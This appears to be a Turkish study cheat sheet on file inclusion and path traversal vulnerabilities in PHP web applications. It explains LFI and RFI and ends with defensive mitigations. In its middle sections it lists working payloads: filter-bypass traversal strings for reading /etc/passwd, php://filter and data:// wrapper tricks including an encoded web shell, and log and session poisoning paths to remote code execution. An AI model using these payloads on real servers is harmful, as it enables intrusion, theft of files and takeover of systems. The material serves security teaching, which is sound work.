# 📂 File Inclusion & Path Traversal (LFI / RFI) - Teknik Özet

## 🔍 Kavramlar ve Temel Mantık
Web uygulamalarında dosya yollarının (paths) kullanıcı girdisiyle kontrol edildiği, ancak yeterince filtrelenmediği durumlarda ortaya çıkan kritik mantık hatalarıdır.

* **Path Traversal (Dizin Gezintisi):** Saldırganın web sunucusunun kök dizininden (web root) çıkarak işletim sisteminin hassas dosyalarına (`/etc/passwd`, `C:\boot.ini`) erişmesidir. `../` (Nokta Nokta Slash) karakterleriyle yapılır.
* **LFI (Local File Inclusion - Yerel Dosya Dahil Etme):** Sunucudaki mevcut dosyaları okumak veya uygulamanın koduna dahil edip çalıştırmak için kullanılır. Genellikle RCE'ye (Uzaktan Kod Çalıştırma) giden ilk adımdır.
* **RFI (Remote File Inclusion - Uzaktan Dosya Dahil Etme):** Sunucuya, dışarıdan (saldırganın kontrolündeki bir URL'den) zararlı kod indirtip çalıştırma işlemidir.

---

## 🛠️ Bypass ve Gizleme (Obfuscation) Taktikleri
Geliştiricilerin koyduğu basit `../` filtrelerini aşmak için kullanılan yöntemler:

1. **Extra Slashes (Fazla Eğik Çizgi):** `/var/www/html` filtresini aşmak için.
   * `?page=/var/www/html/..//..//..//etc/passwd`
2. **Recursive Stripping Bypass:** Filtre `../` karakterlerini sadece 1 kez siliyorsa kullanılır.
   * `?page=....//....//....//etc/passwd` *(Filtre ortadaki ../'i silince geriye yine ../ kalır).*
3. **URL Encoding:** Karakterleri URL formatına çevirerek filtrelerden gizlemek.
   * `../` ➡️ `%2e%2e%2f`
4. **Double URL Encoding:** Uygulama girdiyi iki kez çözüyorsa (decode) kullanılır.
   * `../` ➡️ `%252e%252e%252f`

---

## 🎩 LFI'dan RCE'ye Giden Yollar (Sistem Ele Geçirme)
LFI sadece dosya okumakla sınırlı değildir. Sunucuya kendi kodumuzu yazdırabilirsek, LFI ile o kodu çağırıp RCE elde edebiliriz.

### 1. PHP Wrappers (Sarmalayıcılar)
PHP'nin kendi veri okuma/yazma protokollerini istismar etmek.
* **Dosya İçeriğini Çalmak (Base64 Filter):** Çalıştırılabilir PHP dosyalarının kaynak kodunu ekrana şifreli olarak bastırmak.
  * `?page=php://filter/convert.base64-encode/resource=config.php`
* **Doğrudan Kod Çalıştırmak (Base64 Decode):** Payload'u base64 yapıp sunucuya çözdürerek çalıştırmak.
  * `?page=php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+&cmd=whoami`
* **Data Wrapper (Inline Kod):**
  * `?page=data:text/plain,<?php system('id'); ?>`

### 2. Log Poisoning (Log Zehirleme)
* **Mantık:** Apache (`access.log`) veya SSH loglarına (User-Agent veya URL aracılığıyla) zararlı PHP kodu enjekte edilir (`<?php system($_GET['cmd']); ?>`).
* **Sömürü:** LFI zafiyeti kullanılarak bu log dosyası çağrılır. Sunucu logu okurken içindeki PHP kodunu çalıştırır.
* **Payload:** `?page=/var/log/apache2/access.log&cmd=ls -la`

### 3. Session Poisoning (Oturum Zehirleme)
* **Mantık:** Uygulama kullanıcıdan aldığı bir değeri doğrudan session (oturum) değişkenine atıyorsa, bu değere PHP kodu yazılır.
* **Sömürü:** Tarayıcıdan `PHPSESSID` (örn: `abc123xyz`) alınır ve LFI ile bu dosya çağrılır.
* **Payload:** `?page=/var/lib/php/sessions/sess_abc123xyz&cmd=whoami`

---

## 🛡️ Savunma ve Korunma Yöntemleri (Mitigation)
Bir geliştirici olarak bu zafiyetleri önlemek için:

1. **Kesinlikle Allowlist (Beyaz Liste) Kullanın:** Kullanıcının erişebileceği dosyaları statik bir dizi (array) veya veritabanında tutun. Girdi bu listede yoksa işlemi reddedin.
2. **Kullanıcı Girdisini Dosya Yollarından Uzak Tutun:** Dosya adlarını doğrudan almak yerine ID'ler kullanın (örn: `?file=1` ➡️ `hakkimizda.php`).
3. **Fonksiyonlarla Güvenlik:** PHP'de `basename()` ve `realpath()` fonksiyonlarını kullanarak path traversal (`../`) dizilerini yok edin.
4. **Yapılandırma Kısıtlamaları:** `php.ini` dosyasında `allow_url_include = Off` (RFI'ı engeller) ve `open_basedir` ayarlarını yapılandırın.
